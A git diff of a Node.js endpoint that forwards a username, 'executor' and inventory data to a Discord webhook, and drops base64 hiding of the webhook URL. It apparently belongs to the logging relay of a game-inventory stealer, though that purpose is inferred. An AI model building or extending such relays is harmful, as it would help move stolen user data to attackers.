@@ -1,27 +1,17 @@
 const axios = require('axios');
 
-function fromBase64(b64) {
-    return Buffer.from(b64, 'base64').toString('utf8');
-}
-
 module.exports = async (req, res) => {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
-    const { username, executor, inventoryData, encryptedWebhook } = req.body;
+    const { username, executor, inventoryData, webhookUrl } = req.body;
 
-    if (!encryptedWebhook) {
-        return res.status(400).json({ error: "Missing payload" });
-    }
-
-    const realWebhookUrl = fromBase64(encryptedWebhook);
-
-    if (!realWebhookUrl || !realWebhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-        return res.status(400).json({ error: "Invalid payload" });
+    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+        return res.status(400).json({ error: "Unauthorized endpoint call" });
     }
 
     try {
-        await axios.post(realWebhookUrl, {
+        await axios.post(webhookUrl, {
             embeds: [{
                 title: "🔒 Secure Log Received",
                 color: 65280,
